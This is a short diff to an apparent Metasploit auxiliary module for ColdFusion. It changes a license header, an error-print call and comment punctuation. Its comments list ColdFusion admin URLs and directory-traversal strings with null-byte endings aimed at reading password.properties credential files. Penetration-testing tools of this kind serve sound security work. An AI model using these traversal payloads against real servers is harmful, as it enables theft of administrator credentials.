@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -190,7 +188,7 @@ class Metasploit3 < Msf::Auxiliary
         end
       else
         next if (res.code == 500 or res.code == 404 or res.code == 302)
-        print_error("#{ip} #{res.inspect}")
+        print_error("#{ip} #{res.to_s}")
       end
     end
 
@@ -200,7 +198,7 @@ class Metasploit3 < Msf::Auxiliary
 
 end
 
-#URL's that may work for you:
+# URLs that may work for you:
 #"/CFIDE/administrator/enter.cfm",
 #"/CFIDE/wizards/common/_logintowizard.cfm",
 #"/CFIDE/administrator/archives/index.cfm",
@@ -208,7 +206,7 @@ end
 #"/CFIDE/administrator/entman/index.cfm",
 #"/CFIDE/administrator/logging/settings.cfm",
 
-#Files to grab
+# Files to grab
 #../../../../../../../../../../ColdFusion8/lib/password.properties%00en
 #../../../../../../../../../../CFusionMX7/lib/password.properties%00en
 #../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en
